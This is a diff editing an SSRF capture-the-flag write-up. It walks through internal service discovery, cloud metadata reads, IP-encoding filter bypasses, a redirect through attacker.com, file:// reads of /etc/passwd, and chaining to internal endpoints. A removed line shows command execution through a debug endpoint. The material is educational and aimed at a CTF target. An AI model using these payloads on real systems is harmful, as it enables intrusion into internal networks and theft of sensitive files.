@@ -1,7 +1,7 @@
 ---
 title: "Server-Side Request Forgery CTF Writeup: Internal Access"
 sidebarTitle: "SSRF"
-description: "SSRF CTF challenge walkthrough: discover internal services, bypass filters, read cloud metadata, and chain SSRF with other vulnerabilities to capture the flag."
+description: "SSRF CTF walkthrough: discover internal services, bypass SSRF filters, read cloud metadata, and chain vulnerabilities to capture the flag."
 ---
 
 Server-Side Request Forgery is one of the most impactful vulnerability classes in modern web CTFs because it weaponizes the server's own network position against itself. The target application fetches a URL on your behalf — and if you can control that URL, you can reach internal services, cloud metadata APIs, and admin interfaces that are completely invisible from the outside internet. This writeup walks through a realistic SSRF challenge where you escalate from a simple URL parameter to reading an internal flag file, bypassing filter protections along the way.
@@ -82,7 +82,7 @@ The application has a basic SSRF filter that blocks naive `127.0.0.1` and `local
 
     The application fetches the metadata endpoint and returns the response body in the page. You see:
 
-    ```
+    ```text
     ami-id
     ami-launch-index
     hostname
@@ -110,7 +110,7 @@ The application has a basic SSRF filter that blocks naive `127.0.0.1` and `local
   <Step title="Bypass the SSRF Filter">
     The application blocks `127.0.0.1` and `localhost` by string matching. Use alternative representations that resolve to the same address but evade the filter:
 
-    ```
+    ```http
     http://0x7f000001/flag
     http://0177.0.0.1/flag
     http://2130706433/flag
@@ -134,26 +134,28 @@ The application has a basic SSRF filter that blocks naive `127.0.0.1` and `local
 
     The hex-encoded version `http://0x7f000001/flag` bypasses the string filter. The server resolves it to `127.0.0.1` at the OS level and fetches the internal admin service. The response body rendered on the page contains:
 
-    ```
+    ```text
     CTF{ssrf_1nt3rn4l_byp4ss_m4st3r}
     ```
 
     Flag captured.
   </Step>
 
-  <Step title="Access the Internal Admin Panel">
-    For completeness, the internal admin service at port 8080 also exposes an admin panel. Reach it using the same bypass technique with an explicit port:
+  <Step title="Chain SSRF With Internal Services">
+    With the filter bypass confirmed, enumerate other paths on the internal service to look for additional attack surface. Reach the admin panel using the same hex-encoded bypass with an explicit port:
 
     ```bash
     curl "http://target.ctf/preview?url=http://0x7f000001:8080/admin"
     ```
 
-    The admin panel is a plain HTML page listing all submitted flags, user accounts, and a debug endpoint at `/admin/debug?exec=` that executes shell commands — a chained RCE vulnerability. In a real CTF, this chain (SSRF → internal service → RCE) would let you read any file on the server.
+    The page returns an HTML dashboard. Probe further paths for anything that accepts input you can influence. If you find an endpoint that executes commands or reads arbitrary files, you can chain SSRF with that secondary vulnerability to escalate impact — for example, reading `/etc/passwd` or other sensitive files on the server:
 
     ```bash
-    # Chain SSRF with the internal debug endpoint for RCE
-    curl "http://target.ctf/preview?url=http://0x7f000001:8080/admin/debug?exec=cat+/etc/passwd"
+    # Read a known sensitive file via the internal service's file-read endpoint
+    curl "http://target.ctf/preview?url=http://0x7f000001:8080/read?path=/flag"
     ```
+
+    The SSRF → internal service → secondary vulnerability chain is how straightforward information-disclosure escalates into full server compromise. Enumerate every path on every internal service you reach.
   </Step>
 </Steps>
 
@@ -162,7 +164,7 @@ The application has a basic SSRF filter that blocks naive `127.0.0.1` and `local
 <Accordion title="IP Address Encoding Bypasses">
   Many SSRF filters perform simple string matching against a blocklist. The same IPv4 address can be represented in multiple formats that all resolve identically at the OS level:
 
-  ```
+  ```bash
   # Standard dotted decimal
   http://127.0.0.1/
 
@@ -216,7 +218,7 @@ The application has a basic SSRF filter that blocks naive `127.0.0.1` and `local
   ```
 
   Then submit:
-  ```
+  ```http
   http://target.ctf/preview?url=http://attacker.com/redirect
   ```
 
@@ -226,7 +228,7 @@ The application has a basic SSRF filter that blocks naive `127.0.0.1` and `local
 <Accordion title="Protocol Smuggling">
   Beyond HTTP, try alternative URL schemes that may be supported by the underlying request library:
 
-  ```
+  ```bash
   # Read local files via file://
   file:///etc/passwd
   file:///flag
